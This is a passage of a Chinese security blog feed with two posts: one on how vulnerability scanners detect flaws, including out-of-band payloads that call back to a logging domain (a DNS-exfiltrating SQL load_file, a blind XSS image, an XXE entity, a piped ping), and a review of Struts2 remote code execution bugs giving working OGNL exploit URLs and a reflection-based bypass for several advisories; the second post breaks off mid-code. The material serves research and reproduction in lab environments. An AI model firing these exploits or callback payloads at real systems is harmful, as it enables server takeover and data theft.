plain"><table><tr><td class="code"><pre><span class="line">payload: &quot;... updatexml(1,concat(&quot;:&quot;,rand_str1,rand_str2),1) ...&quot;</span><br><span class="line">condition: (rand_str1 + rand_str2) in response.content</span><br></pre></td></tr></table></figure><p>针对报错注入来说，利用随机性进行 Payload 构造可以比较稳定和准确地识别出漏洞，固定字符串会因一些小概率事件造成误报。不知道大家是否明白上面两行代码的意思，简单的说就是 Payload 中包含一个可预测结果的随机数据，验证时只需要验证这个可预测结果是否存在就行了。</p><p><strong>UNION SQL Injection</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload1: &quot;... union select md5(rand_num) ...&quot;</span><br><span class="line">condition1: md5(rand_num) in response.content</span><br><span class="line"></span><br><span class="line">payload2: &quot;... union select concat(rand_str1, rand_str2) ...&quot;</span><br><span class="line">condition2: (rand_str1 + rand_str2) in response.content</span><br></pre></td></tr></table></figure><p><code>md5(rand_num)</code> 这个很好理解，MySQL 中自带函数，当 Payload 执行成功时，因具有回显所以在页面上定有 <code>md5(rand_num)</code> 的哈希值，因 Payload 具有随机性，所以误报率较低。</p><h5 id="ii-XSS（回显）"><a href="#ii-XSS（回显）" class="headerlink" title="ii. XSS（回显）"></a>ii. XSS（回显）</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload: &quot;... var _=rand_str1+rand_str2;confirm(_); ...&quot;</span><br><span class="line">condition: (rand_str1 + rand_str2) in response.content</span><br></pre></td></tr></table></figure><p>因没怎么深入研究过 XSS 这个东西，所以大家就意会一下示例代码的意思吧。QWQ</p><h5 id="iii-Local-File-Inclusion-Arbitrary-File-Download（回显）"><a href="#iii-Local-File-Inclusion-Arbitrary-File-Download（回显）" class="headerlink" title="iii. Local File Inclusion/Arbitrary File Download（回显）"></a>iii. Local File Inclusion/Arbitrary File Download（回显）</h5><p>本地文件包含和任意文件下载的最大区别在哪？本地文件包含不仅能够获取文件内容还可以动态包含脚本文件执行代码，而任意文件下载只能获取文件内容无法执行代码。XD</p><p>所以呢，在针对此类漏洞进行检测时，在进行文件包含/下载测试的时候需要找一个相对 Web 应用固定的文件作为测试向量：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload: &quot;... ?file=../../../fixed_file ...&quot;</span><br><span class="line">condition: (content_flag_in_fixed_file) in response.content</span><br></pre></td></tr></table></figure><p>例如 WordPress 应用路径下 <code>./wp-config.php</code> 文件是应用默认必须的配置文件，而文件中的特殊字符串标识 <code>require_once(ABSPATH . &#39;wp-settings.php&#39;);</code> 通常是不会去改动它的（当然也可以是其他的特征字符串），扫描文件下载时只需要去尝试下载 <code>./wp-config.php</code> 文件，并检测其中的内容是否含有特征字符串即可判断是否存在漏洞了。</p><h5 id="iv-Remote-Code-Command-Execution（回显）"><a href="#iv-Remote-Code-Command-Execution（回显）" class="headerlink" title="iv. Remote Code/Command Execution（回显）"></a>iv. Remote Code/Command Execution（回显）</h5><p>远程代码/命令执行都是执行，对该类漏洞要进行无害扫描，通常的做法是打印随机字符串，或者运行一下特征函数，然后检查页面返回是否存在特征标识来确认漏洞与否。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload: &quot;... echo md5(rand_num); ...&quot;</span><br><span class="line">condition: (content_flag) in response.content</span><br></pre></td></tr></table></figure><p>当然了，要执行什么样的特征命令这还需要结合特定的漏洞环境来决定。</p><h5 id="v-SSTI-ELI（回显）"><a href="#v-SSTI-ELI（回显）" class="headerlink" title="v. SSTI/ELI（回显）"></a>v. SSTI/ELI（回显）</h5><p>模板注入和表达式注入相对于传统的 SQLi 和 XSS 来说，应该算得上是在开框架化、整体化的过程中产生的问题，当模板内容可控时各种传统的 Web 漏洞也就出现了，XSS、命令执行都能够通过模板注入活着表达式注入做到。曾经风靡一时的 Struts2 漏洞我觉得都能归到此类漏洞中。通常检测只需构造相应模板语言对应的表达式即可，存在注入表达式会得以执行并返回内容：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload1: &quot;... param=%(rand_num1 + rand_num2) ...&quot;</span><br><span class="line">condition1: (rand_num1 + rand_num2) in response.content</span><br><span class="line"></span><br><span class="line">payload2: &quot;... param=%(rand_num1 * rand_num2) ...&quot;</span><br><span class="line">condition2: (rand_num1 * rand_num2) in response.content</span><br><span class="line"></span><br><span class="line">payload3: &quot;... #response=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#response.println(rand_str1+rand_str2),#response.flush(),#response.close() ..&quot;</span><br><span class="line">condition3: (rand_str1+ rand_str2) in response.content</span><br></pre></td></tr></table></figure><h5 id="vi-文件哈希"><a href="#vi-文件哈希" class="headerlink" title="vi. 文件哈希"></a>vi. 文件哈希</h5><p>有时候漏洞只与单个文件有关，例如 Flash、JavaScript 等文件造成的漏洞，这个时候就可以利用文件哈希来直接判断是否存在漏洞。扫描检测时，首先需要给定路径下载对应的文件然后计算哈希与统计的具有漏洞的所有文件哈希进行比对，匹配成功则说明漏洞存在：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload: &quot;http://vuln.com/vuln_swf_file.swf&quot;</span><br><span class="line">condition: hash(vul_swf_file.swf) == hash_recorded</span><br></pre></td></tr></table></figure><p>以上就是针对 Web 漏洞检测方法中的 “直接判断” 进行了示例说明，因 Web 漏洞类型繁多且环境复杂，这里不可能对其进行一一举例，所举的例子都是为了更好的说明 “直接判断” 这种检测方法。:)</p><h4 id="2-间接判断"><a href="#2-间接判断" class="headerlink" title="2. 间接判断"></a>2. 间接判断</h4><p>“无回显？测不了，扫不了，很尴尬！怎么办。。。“</p><p>在很久很久之前，我遇到上诉这些漏洞环境时是一脸懵逼的 (⇀‸↼‶)，一开始懂得了用回连进行判断，后来有了 <code>python -m SimpleHTTPServer</code> 作为简单实时的 HTTP Server 作为回连监控，再后来有了<a href="http://arxiv.org/ftp/arxiv/papers/1303/1303.3047.pdf" target="_blank" rel="noopener">《Data Retrieval over DNS in SQL Injection Attacks》</a>这篇 Paper，虽然文章说的技术点是通过 DNS 查询来获取 SQL 盲注的数据，但是 “Data Retrieval over DNS” 这种技术已经可以应用到大多数无法回显的漏洞上了，进而出现了一些公开的平台供安全研究爱好者们使用，如：乌云的 cloudeye 和 Bugscan 的 DNSLog，当然还有我重写的 CEYE.IO 平台。</p><p>“Data Retrieval over DNS” 技术原理其实很简单，首先需要有一个可以配置的域名，比如：ceye.io，然后通过代理商设置域名 ceye.io 的 nameserver 为自己的服务器 A，然后再服务器 A 上配置好 DNS Server，这样以来所有 ceye.io 及其子域名的查询都会到 服务器 A 上，这时就能够实时地监控域名查询请求了，图示如下（借的 Ricter 的）：</p><p><img src="/images/articles/2016-06-01-how-to-scan-and-check-vulnerabilities/9.png" alt=""></p><p>说了那么多，还是不知道怎么用么？那就直接看示例吧（所以后端平台都用 CEYE.IO 作为例子）。</p><h5 id="i-XSS（无回显）"><a href="#i-XSS（无回显）" class="headerlink" title="i. XSS（无回显）"></a>i. XSS（无回显）</h5><p>XSS 盲打在安全测试的时候是比较常用的，“看到框就想 X” 也是每位 XSSer 的信仰：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload: &quot;... &gt;&lt;img src=http://record.com/?blindxss ...&quot;</span><br><span class="line">condition: &#123;http://record.com/?blindxss LOG&#125; in HTTP requests LOGs</span><br></pre></td></tr></table></figure><p>通过盲打，让触发者浏览器访问预设至的链接地址，如果盲打成功，会在平台上收到如下的链接访问记录：</p><p><img src="/images/articles/2016-06-01-how-to-scan-and-check-vulnerabilities/10.png" alt=""></p><h5 id="ii-SQLi（无回显）"><a href="#ii-SQLi（无回显）" class="headerlink" title="ii. SQLi（无回显）"></a>ii. SQLi（无回显）</h5><p>SQL 注入中无回显的情况是很常见的，但是有了 “Data Retrieval over DNS” 这种技术的话一切都变得简单了，前提是目标环境符合要求。<a href="http://docs.hackinglab.cn/HawkEye-Log-Dns-Sqli.html" target="_blank" rel="noopener">《HawkEye Log/Dns 在Sql注入中的应用》</a>这篇文章提供了一些常见数据库中使用 “Data Retrieval over DNS” 技术进行盲注的 Payloads。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload: &quot;... load_file(concat(&apos;\\\\&apos;,user(),&apos;.record.com\\blindsqli&apos;))</span><br><span class="line">condition: &#123;*.record.com LOG&#125; in DNS queries LOGs</span><br></pre></td></tr></table></figure><p>只要目标系统环境符合要求并且执行了注入的命令，那么就会去解析预先设置好的域名，同时通过监控平台能够拿到返回的数据。</p><p><img src="/images/articles/2016-06-01-how-to-scan-and-check-vulnerabilities/11.png" alt=""></p><h5 id="iii-SSRF（无回显）"><a href="#iii-SSRF（无回显）" class="headerlink" title="iii. SSRF（无回显）"></a>iii. SSRF（无回显）</h5><p>根据上面两个例子，熟悉 SSRF 的同学肯定也是知道怎么玩了：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload: &quot;... &lt;!ENTITY test SYSTEM &quot;http://record.com/?blindssrf&quot;&gt; ...&quot;</span><br><span class="line">condition: &#123;http://record.com/?blindssrf LOG&#125; in HTTP requests LOGs</span><br></pre></td></tr></table></figure><h5 id="iv-RCE（无回显）"><a href="#iv-RCE（无回显）" class="headerlink" title="iv. RCE（无回显）"></a>iv. RCE（无回显）</h5><p>命令执行/命令注入这个得好好说一下，我相信很多同学都懂得在命令执行无法回显的时候借用类似 <code>python -m SimpleHTTPServer</code> 这样的环境，采用回连的检测机制来实时监控访问日志。<em>nix 系统环境下一般是使用 <code>curl</code> 命令或者 <code>wget</code> 命令，而 windows 系统环境就没有这么方便的命令去直接访问一个链接，我之前常用的是 <code>ftp</code> 命令和 PowerShell 中的文件下载来访问日志服务器。现在，有了一个比较通用的做法同时兼顾 </em>nix 和 windows 平台，那就是 <code>ping</code> 命令，当 ping 一个域名时会对其进行一个递归 DNS 查询的过程，这个时候就能在后端获取到 DNS 的查询请求，当命令真正被执行且平台收到回显时就能说明漏洞确实存在。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload: &quot;... | ping xxflag.record.com ...&quot;</span><br><span class="line">condition: &#123;xxflag.record.com LOG&#125; in DNS queries LOGs</span><br></pre></td></tr></table></figure><p><img src="/images/articles/2016-06-01-how-to-scan-and-check-vulnerabilities/12.png" alt=""></p><p>通过这几个 “间接判断” 的示例，相信大家也大概了解了在漏洞无回显的情况下如何进行扫描和检测了。更多的无回显 Payloads 可以通过 <a href="http://ceye.io/payloads" target="_blank" rel="noopener">http://ceye.io/payloads</a> 进行查看。（勿喷）</p><h3 id="应急实战举例"><a href="#应急实战举例" class="headerlink" title="应急实战举例"></a>应急实战举例</h3><p>原理和例子扯了这么多，也该上上实际的扫描检测案例了。</p><h4 id="Java-反序列化（通用性举例，ftp-ping）"><a href="#Java-反序列化（通用性举例，ftp-ping）" class="headerlink" title="Java 反序列化（通用性举例，ftp/ping）"></a>Java 反序列化（通用性举例，ftp/ping）</h4><p>首先说说 15 年底爆发的 Java 反序列化漏洞吧，这个漏洞应该算得上是 15 年 Web 漏洞之最了。记得当时应急进行扫描的时候，WebLogic 回显 PoC 并没有搞定，对其进行扫描检测的时候使用了回连的方式进行判断，又因为待测目标包含 *nix 和 windows 环境，所以是写了两个不同的 Payloads 对不同的系统环境进行检测，当时扫描代码的 Payloads 生成部分为：</p><p><strong>i. *nix</strong></p><p><img src="/images/articles/2016-06-01-how-to-scan-and-check-vulnerabilities/13.png" alt=""></p><p>当时真实的日志内容：</p><p><img src="/images/articles/2016-06-01-how-to-scan-and-check-vulnerabilities/14.png" alt=""></p><p>可以看到我在构造 Payload 的时候通过链接参数来唯一识别每一次测试的 IP 地址和端口，这样在检查访问日志的时候就能确定该条记录是来自于哪一个测试目标（因为入口 IP 和出口 IP 可能不一致），同时在进行批量扫描的时候也能方便进行目标确认和日志处理。</p><p><strong>ii. windows</strong></p><p><img src="/images/articles/2016-06-01-how-to-scan-and-check-vulnerabilities/15.png" alt=""></p><p>当时真实的日志内容：</p><p><img src="/images/articles/2016-06-01-how-to-scan-and-check-vulnerabilities/16.png" alt=""></p><p>因为 windows 上的 <code>ftp</code> 命令无法带类似参数一样的标志，所以通过观察 FTP Server 连接日志上不是很好确认当时测试的目标，因为入口 IP 和出口 IP 有时不一致。</p><p>上面的这些 PoC 和日志截图都是去年在应急时真实留下来的，回想当时再结合目前的一些知识，发现使用通用的 Payload <code>ping xxxxx.record.com</code> 并使用 “Data Retrieval over DNS” 技术来收集信息日志能够更为通用方便地进行检测和扫描。所以，最近更换了一下 Payload 结合 CEYE.IO 平台又对 WebLogic 反序列化漏洞的影响情况又进行了一次摸底：</p><p><img src="/images/articles/2016-06-01-how-to-scan-and-check-vulnerabilities/17.png" alt=""></p><p>这里添加一个随机字符串作为一个子域名的一部分是为了防止多次检测时本地 DNS 缓存引起的问题（系统一般会缓存 DNS 记录，同一个域名第一次通过网络解析得到地址后，第二次通常会直接使用本地缓存而不会再去发起查询请求）。</p><p>相应平台的记录为（数量略多）：</p><p><img src="/images/articles/2016-06-01-how-to-scan-and-check-vulnerabilities/18.png" alt=""></p><p>（顺便说一下，有一个这样的平台还是很好使的 QWQ）</p><p>不知不觉就写了这么多 QWQ，好累。。。能总结和需要总结的东西实在太多了，这次就先写这么一点吧。</p><p>不知道仔细看完这篇文章的人会有何想法，也许其中的一些总结你都知道，甚至比我知道的还要多，但我写出来只是想对自己的经验和知识负责而已，欢迎大家找我讨论扫描检测相关的东西。:) </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;好像很久没发文了，近日心血来潮准备谈谈 “漏洞检测的那些事儿”。现在有一个现象就是一旦有危害较高的漏洞的验证 PoC 或者利用 EXP 被公布出来，就会有一大群饥渴难忍的帽子们去刷洞，对于一个路人甲的我来说，看得有点眼红。XD&lt;/p&gt;
&lt;p&gt;刷洞归刷洞，蛋还是要扯的。漏洞从
      
    
    </summary>
    
    
      <category term="security" scheme="http://rickgray.me/tags/security/"/>
    
      <category term="web" scheme="http://rickgray.me/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>Struts2 历史 RCE 漏洞回顾不完全系列</title>
    <link href="http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities/"/>
    <id>http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities/</id>
    <published>2016-05-05T16:00:00.000Z</published>
    <updated>2018-04-24T15:52:36.485Z</updated>
    
    <content type="html"><![CDATA[<p>刚爆出 Struts2 远程命令执行 S2-032 的时候让我有点心无力，作为一名安全研究员还是不能偷懒，经典漏洞还是应该去分析回顾一下的。</p><p>如果你想看的是详细的底层代码跟踪分析，那我也只能 say sorry 了。能力有限一些细节无法很好的写在这里，因为确实太多了 QWQ。这里只是对 ST2 历史 RCE 漏洞的一个回顾，同时也希望对这些有漏洞有疑惑或者和我一样曾经对它感到吃力的人带来一点点帮助。所有文中所提漏洞的测试环境 WAR 包附后，想要自己进行复现测试或者查看漏洞起因关键代码的同学可以下载下来跟着文章实践一下。</p><p>已经完成：S2-001, S2-007, S2-008, S2-012, S2-013, S2-015, S2-016, S2-029, S2-32 （WAR 包集合 <a href="http://pan.baidu.com/s/1nvfDDdZ" target="_blank" rel="noopener">http://pan.baidu.com/s/1nvfDDdZ</a>:tdb8）</p><p>未完成：S2-003, S2-005, S2-009, S2-020, S2-021, S2-022</p><p>（前方高能，一大波 “计算器” 即将来临）</p><h3 id="S2-001"><a href="#S2-001" class="headerlink" title="S2-001"></a>S2-001</h3><blockquote><p>官方链接：<a href="https://struts.apache.org/docs/s2-001.html" target="_blank" rel="noopener">https://struts.apache.org/docs/s2-001.html</a></p><p>影响版本：Struts 2.0.0 - Struts 2.0.8</p><p>修复摘要：数据 re-display 时禁止执行 OGNL 表达式</p></blockquote><p>该漏洞其实是因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表达式 <code>%{value}</code> 进行解析，然后重新填充到对应的表单数据中。例如注册或登录页面，提交失败后端一般会默认返回之前提交的数据，由于后端使用 <code>%{value}</code> 对提交的数据执行了一次 OGNL 表达式解析，所以可以直接构造 Payload 进行命令执行：</p><pre><code>%{@java.lang.Runtime@getRuntime().exec(&quot;open /Applications/Calculator.app&quot;)}</code></pre><p><img src="/images/articles/2016-05-06-review-struts2-remote-command-execution-vulnerabilities/1.png" alt=""></p><h3 id="S2-007"><a href="#S2-007" class="headerlink" title="S2-007"></a>S2-007</h3><blockquote><p>官方链接：<a href="https://struts.apache.org/docs/s2-007.html" target="_blank" rel="noopener">https://struts.apache.org/docs/s2-007.html</a></p><p>影响版本：Struts 2.0.0 - Struts 2.2.3</p><p>修复摘要：在转换的过程中进行字符过滤</p><p>修复补丁：<a href="https://fisheye6.atlassian.com/changelog/struts?cs=b4265d369dc29d57a9f2846a85b26598e83f3892" target="_blank" rel="noopener">https://fisheye6.atlassian.com/changelog/struts?cs=b4265d369dc29d57a9f2846a85b26598e83f3892</a></p></blockquote><p>当配置了验证规则 <code>&lt;ActionName&gt;-validation.xml</code> 时，若类型验证转换出错，后端默认会将用户提交的表单值通过字符串拼接，然后执行一次 OGNL 表达式解析并返回。例如这里有一个 <code>UserAction</code>：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">(...)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserAction</span> <span class="keyword">extends</span> <span class="title">ActionSupport</span> </span>&#123;</span><br><span class="line"><span class="keyword">private</span> Integer age;</span><br><span class="line"><span class="keyword">private</span> String name;</span><br><span class="line"><span class="keyword">private</span> String email;</span><br><span class="line"></span><br><span class="line">(...)</span><br></pre></td></tr></table></figure><p>然后配置有 <code>UserAction-validation.xml</code>：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span> <span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE validators PUBLIC</span></span><br><span class="line"><span class="meta">"-//OpenSymphony Group//XWork Validator 1.0//EN"</span></span><br><span class="line"><span class="meta">"http://www.opensymphony.com/xwork/xwork-validator-1.0.2.dtd"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">validators</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">"age"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">field-validator</span> <span class="attr">type</span>=<span class="string">"int"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"min"</span>&gt;</span>1<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"max"</span>&gt;</span>150<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">field-validator</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">field</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">validators</span>&gt;</span></span><br></pre></td></tr></table></figure><p>当用户提交 <code>age</code> 为字符串而非整形数值时，后端用代码拼接 <code>&quot;&#39;&quot; + value + &quot;&#39;&quot;</code> 然后对其进行 OGNL 表达式解析。要成功利用，只需要找到一个配置了类似验证规则的表单字段使之转换出错，借助类似 SQLi 注入单引号拼接的方式即可注入任意 OGNL 表达式。</p><p>因为受影响版本为 Struts2 2.0.0 - Struts2 2.2.3，所以这里给出绕过安全配置进行命令执行的 Payload：</p><pre><code>&apos; + (#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#foo=new java.lang.Boolean(&quot;false&quot;) ,#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=#foo,@java.lang.Runtime@getRuntime().exec(&quot;open /Applications/Calculator.app&quot;)) + &apos;</code></pre><p><img src="/images/articles/2016-05-06-review-struts2-remote-command-execution-vulnerabilities/4.png" alt=""></p><h3 id="S2-008"><a href="#S2-008" class="headerlink" title="S2-008"></a>S2-008</h3><blockquote><p>官方链接：<a href="https://struts.apache.org/docs/s2-008.html" target="_blank" rel="noopener">https://struts.apache.org/docs/s2-008.html</a></p><p>影响版本：Struts 2.1.0 - Struts 2.3.1</p><p>修复摘要：添加参数名和 Cookie 名白名单 acceptedParamNames = “[a-zA-Z0-9.][()_’]+”;</p></blockquote><p>S2-008 涉及多个漏洞，Cookie 拦截器错误配置可造成 OGNL 表达式执行，但是由于大多 Web 容器（如 Tomcat）对 Cookie 名称都有字符限制，一些关键字符无法使用使得这个点显得比较鸡肋。另一个比较鸡肋的点就是在 struts2 应用开启 <code>devMode</code> 模式后会有多个调试接口能够直接查看对象信息或直接执行命令，正如 kxlzx 所提这种情况在生产环境中几乎不可能存在，因此就变得很鸡肋的，但我认为也不是绝对的，万一被黑了专门丢了一个开启了 debug 模式的应用到服务器上作为后门也是有可能的。</p><p>例如在 <code>devMode</code> 模式下直接添加参数 <code>?debug=command&amp;expression=&lt;OGNL EXP&gt;</code> 会直接执行后面的 OGNL 表达式，因此可以直接执行命令（注意转义）：</p><pre><code>http://localhost:8080/S2-008/devmode.action?debug=command&amp;expression=(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@java.lang.Runtime@getRuntime%28%29.exec%28%22open%20%2fApplications%2fCalculator.app%22%29)</code></pre><p><img src="/images/articles/2016-05-06-review-struts2-remote-command-execution-vulnerabilities/5.png" alt=""></p><h3 id="S2-012"><a href="#S2-012" class="headerlink" title="S2-012"></a>S2-012</h3><blockquote><p>官方链接：<a href="https://struts.apache.org/docs/s2-012.html" target="_blank" rel="noopener">https://struts.apache.org/docs/s2-012.html</a></p><p>影响版本：Struts 2.0.0 － Struts 2。3.13</p><p>修复摘要：默认禁用 OGNLUtil 类的 OGNL 表达式执行</p></blockquote><p>如果在配置 Action 中 Result 时使用了重定向类型，并且还使用 <code>${param_name}</code> 作为重定向变量，例如：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">"S2-012"</span> <span class="attr">extends</span>=<span class="string">"struts-default"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">"user"</span> <span class="attr">class</span>=<span class="string">"com.demo.action.UserAction"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">"redirect"</span> <span class="attr">type</span>=<span class="string">"redirect"</span>&gt;</span>/index.jsp?name=$&#123;name&#125;<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">"input"</span>&gt;</span>/index.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">"success"</span>&gt;</span>/index.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">package</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这里 <code>UserAction</code> 中定义有一个 <code>name</code> 变量，当触发 <code>redirect</code> 类型返回时，Struts2 获取使用 <code>${name}</code> 获取其值，在这个过程中会对 <code>name</code> 参数的值执行 OGNL 表达式解析，从而可以插入任意 OGNL 表达式导致命令执行：</p><pre><code>http://localhost:8080/S2-012/user.action?name=%25%7B%28%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%29%28%23_memberAccess%5B%27allowStaticMethodAccess%27%5D%3Dtrue%29%28@java.lang.Runtime@getRuntime%28%29.exec%28%22open%20%2fApplications%2fCalculator.app%22%29%29%7D</code></pre><p><img src="/images/articles/2016-05-06-review-struts2-remote-command-execution-vulnerabilities/6.png" alt=""></p><h3 id="S2-013-S2-014"><a href="#S2-013-S2-014" class="headerlink" title="S2-013 | S2-014"></a>S2-013 | S2-014</h3><blockquote><p>官方链接：<a href="https://struts.apache.org/docs/s2-013.html" target="_blank" rel="noopener">https://struts.apache.org/docs/s2-013.html</a>, <a href="https://struts.apache.org/docs/s2-014.html" target="_blank" rel="noopener">https://struts.apache.org/docs/s2-014.html</a></p><p>影响版本：Struts 2.0.0 - Struts 2.3.14 (Struts 2.3.14.1)</p><p>修复摘要：在对标签进行请求参数操作时禁用 OGNL 表达式解析</p></blockquote><p>Struts2 标签中 <code>&lt;s:a&gt;</code> 和 <code>&lt;s:url&gt;</code> 都包含一个 <code>includeParams</code> 属性，其值可设置为 <code>none</code>，<code>get</code> 或 <code>all</code>，参考官方其对应意义如下：</p><ol><li>none - 链接不包含请求的任意参数值（默认）</li><li>get - 链接只包含 GET 请求中的参数和其值</li><li>all - 链接包含 GET 和 POST 所有参数和其值</li></ol><p>若设置了 <code>includeParams=&quot;get&quot;</code> 或者 <code>includeParams=&quot;all&quot;</code>，在获取对应类型参数时后端会对参数值进行 OGNL 表达式解析，因此可以插入任意 OGNL 表达式导致命令执行：</p><pre><code>http://localhost:8080/S2-013/link.action?xxxx=%25%7B%28%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%29%28%23_memberAccess%5B%27allowStaticMethodAccess%27%5D%3Dtrue%29%28@java.lang.Runtime@getRuntime%28%29.exec%28%22open%20%2fApplications%2fCalculator.app%22%29%29%7D</code></pre><p><img src="/images/articles/2016-05-06-review-struts2-remote-command-execution-vulnerabilities/7.png" alt=""></p><p>S2-014 是对 S2-013 修复的加强，在 S2-013 修复的代码中忽略了 <code>${ognl_exp}</code> OGNL 表达式执行的方式，因此 S2-014 是对其的补丁加强。</p><pre><code>http://localhost:8080/S2-013/link.action?xxxx=%24%7B%28%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%29%28%23_memberAccess%5B%27allowStaticMethodAccess%27%5D%3Dtrue%29%28@java.lang.Runtime@getRuntime%28%29.exec%28%22open%20%2fApplications%2fCalculator.app%22%29%29%7D</code></pre><h3 id="S2-015"><a href="#S2-015" class="headerlink" title="S2-015"></a>S2-015</h3><blockquote><p>官方链接：<a href="https://struts.apache.org/docs/s2-015.html" target="_blank" rel="noopener">https://struts.apache.org/docs/s2-015.html</a></p><p>影响版本：Struts 2.0.0 - Struts 2.3.14.2</p><p>修复摘要：针对 Action 名称进行默认字符限制 [a-z]<em>[A-Z]</em>[0-9]<em>[.-_!/]</em> </p></blockquote><p>漏洞产生于配置了 Action 通配符 <code>*</code>，并将其作为动态值时，解析时会将其内容执行 OGNL 表达式，例如：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">"S2-015"</span> <span class="attr">extends</span>=<span class="string">"struts-default"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">"*"</span> <span class="attr">class</span>=<span class="string">"com.demo.action.PageAction"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">result</span>&gt;</span>/&#123;1&#125;.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">package</span>&gt;</span></span><br></pre></td></tr></table></figure><p>上述配置能让我们访问 <code>name.action</code> 时使用 <code>name.jsp</code> 来渲染页面，但是在提取 <code>name</code> 并解析时，对其执行了 OGNL 表达式解析，所以导致命令执行。在实践复现的时候发现，由于 <code>name</code> 值的位置比较特殊，一些特殊的字符如 <code>/</code> <code>&quot;</code> <code>\</code> 都无法使用（转义也不行），所以在利用该点进行远程命令执行时一些带有路径的命令可能无法执行成功。</p><p>还有需要说明的就是在 Struts 2.3.14.1 - Struts 2.3.14.2 的更新内容中，删除了 <code>SecurityMemberAccess</code> 类中的 <code>setAllowStaticMethodAccess</code> 方法，因此在 2.3.14.2 版本以后都不能直接通过 <code>#_memberAccess[&#39;allowStaticMethodAccess&#39;]=true</code> 来修改其值达到重获静态方法调用的能力。</p><p>这里为了到达执行命令的目的可以用 kxlzx 提到的调用动态方法 <code>(new java.lang.ProcessBuilder(&#39;calc&#39;)).start()</code> 来解决，另外还可以借助 Java 反射机制去间接修改：</p><pre><code>#context[&apos;xwork.MethodAccessor.denyMethodExecution&apos;]=false,#m=#_memberAccess.getClass().getDeclaredField(&apos;allowStaticMethodAccess&apos;),#m.setAccessible(true),#m.set(#_memberAccess,true)</code></pre><p>可以构造 Payload 如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://localhost:8080/S2-015/$&#123;%23context[&apos;xwork.MethodAccessor.denyMethodExecution&apos;]=false,%23f=%23_memberAccess.getClass().getDeclaredField(&apos;allowStaticMethodAccess&apos;),%23f.setAccessible(true),%23f.set(%23_memberAccess,true),@java.lang.Runtime@getRuntime().exec(&apos;calc&apos;)&#125;.action</span><br></pre></td></tr></table></figure><p><img src="/images/articles/2016-05-06-review-struts2-remote-command-execution-vulnerabilities/8.png" alt=""></p><p>除了上面所说到的这种情况以外，S2-015 还涉及一种二次引用执行的情况：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">"param"</span> <span class="attr">class</span>=<span class="string">"com.demo.action.ParamAction"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span 